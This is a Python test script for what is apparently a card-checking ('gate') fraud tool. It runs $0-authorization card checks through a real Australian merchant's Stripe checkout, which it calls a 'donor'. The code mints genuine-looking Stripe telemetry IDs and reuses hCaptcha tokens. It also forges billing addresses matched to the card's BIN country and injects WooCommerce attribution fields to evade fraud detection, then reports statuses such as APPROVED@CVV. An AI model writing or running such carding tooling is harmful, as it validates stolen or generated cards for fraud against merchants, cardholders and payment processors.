# language: Python 3.12+, file: scratch/_live_sprint1_test.py, target: Windows 11
# Sprint 1 live verification on the confirmed APPROVED donor.
# Compares baseline uuid4 telemetry vs new live-cookie telemetry, checks hcaptcha,
# geo alignment, wc_attribution, then runs one full check_card ($0 auth).
import asyncio
import sys
import time
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from curl_cffi.requests import AsyncSession

import gate_client as gc
from setup_gate import GateSession, bin_lookup, bin_alpha2, load_ready_gates

DONOR = "https://www.blackbeltprotein.com.au"


async def main():
    print("=" * 78)
    print("[*] SPRINT 1 LIVE TEST —", DONOR)

    # --- 1. Baseline check: beacon-POST mint from m.stripe.com/6 (raw shape) ---
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        r = await s.post("https://m.stripe.com/6", data=gc.m_stripe_beacon_payload(),
                         headers={"Origin": "https://js.stripe.com",
                                  "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                         timeout=8)
    print(f"[*] m.stripe.com/6 beacon POST HTTP {r.status_code}")
    baseline_ids = gc.parse_m_stripe_response(r.json() if r.status_code == 200 else {})
    print(f"[*] raw mint check : muid={baseline_ids['muid'][:28] or '(none)'}... sid={baseline_ids['sid'][:16] or '(none)'}...")

    # --- 2. Full GateSession open (register -> scrape -> hcaptcha -> cookies -> telem) ---
    gate = load_ready_gates()[0]
    gs = GateSession(gate)
    t0 = time.perf_counter()
    ok, detail = await gs.open()
    ms = int((time.perf_counter() - t0) * 1000)
    if not ok:
        print(f"[x] GateSession.open FAILED in {ms}ms: {detail}")
        return
    print(f"[+] Session opened in {ms}ms | acct={gs.account_email}")

    telem_uuid4_baseline_muid = str(uuid.uuid4())  # what OLD code would have sent
    print("-" * 78)
    print("COMPARISON telemetry identity:")
    print(f"  OLD (uuid4):      muid={telem_uuid4_baseline_muid}")
    print(f"  NEW (live mint):  muid={gs.telem['muid']}")
    print(f"  NEW sid:          {gs.telem['sid']}")
    import re as _re
    live_mint = bool(_re.fullmatch(r"[0-9a-f-]{36}[0-9a-f]{6}", gs.telem["muid"]))
    print(f"  => SERVER-MINTED IDS USED: {live_mint}")
    print(f"[*] hcaptcha_token: {'PRESENT (' + gs.hcaptcha_token[:20] + '...)' if gs.hcaptcha_token else 'not issued by endpoints (fallback OK)'}")
    radar_in_body = "_hcaptcha_token" in gs.telem
    body_probe = gc.tokenize_body({"number": "4111111111111111", "month": "12", "year": "2029", "cvc": "123"},
                                  gs.telem, DONOR)
    print(f"[*] tokenize carries radar_options[hcaptcha_token]: {'radar_options[hcaptcha_token]' in body_probe} (telem has token: {radar_in_body})")

    # --- 3. Geo alignment demo: same card checked as US vs AU billing ---
    probe = gc.gen_probe_card("453927")  # VISA BIN
    binfo = await bin_lookup(probe["number"][:6])
    a2 = bin_alpha2(binfo) or "US"
    print(f"[*] probe BIN {probe['number'][:6]} -> alpha2={a2 or '?'} ({binfo.get('bank', {}).get('name') if isinstance(binfo.get('bank'), dict) else '?'})")
    t_us = dict(gs.telem); t_us.update(gc.geo_identity_fields("US"))
    t_loc = dict(gs.telem); t_loc.update(gc.geo_identity_fields(a2))
    print(f"    billing US-mode : {t_us['city']}, {t_us['state']} {t_us['postal_code']} / {t_us['country']}")
    print(f"    billing BIN-mode: {t_loc['city']}, {t_loc['state']} {t_loc['postal_code']} / {t_loc['country']}")

    attr = gc.wc_attribution_fields(DONOR)
    print(f"[*] wc_attribution fields ready: {len(attr)} keys, entry={attr['wc_order_attribution_session_entry'][:60]}...")

    # --- 4. Full pipeline: one real $0-auth check through the new engine ---
    card_raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    t1 = time.perf_counter()
    res = await gs.check_card(card_raw, bin_alpha2=a2)
    lat = int((time.perf_counter() - t1) * 1000)
    print("-" * 78)
    print(f"LIVE CHECK: {gc.mask_pan(card_raw)} [{a2}-aligned billing]")
    print(f"  status   : {res['status']}")
    print(f"  detail   : {res['detail']}")
    print(f"  latency  : {lat}ms")
    await gs.close()

    print("=" * 78)
    verdict_ok = res["status"] in ("APPROVED", "APPROVED@CVV", "APPROVED@CCN", "3DS_REQUIRED", "DECLINED")
    print(f"RESULT: session=OK, server_minted_ids={'yes' if live_mint else 'fallback'}, "
          f"hcaptcha={'yes' if gs.hcaptcha_token else 'no'}, pipeline_verdict={res['status']} "
          f"({'expected class' if verdict_ok else 'UNEXPECTED'})")


if __name__ == "__main__":
    asyncio.run(main())
